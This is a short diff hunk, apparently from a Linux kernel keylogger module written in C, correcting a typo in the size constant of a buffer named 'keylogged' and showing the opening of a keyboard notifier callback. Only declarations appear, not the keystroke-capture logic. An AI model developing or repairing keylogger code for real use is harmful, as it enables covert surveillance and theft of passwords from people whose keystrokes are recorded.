@@ -35,7 +35,7 @@ static const char* keymapShiftActivated[] =
 
 static int shiftKeyDepressed = 0;
 
-char keylogged[BUFFFER];
+char keylogged[BUFFER];
 
 int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
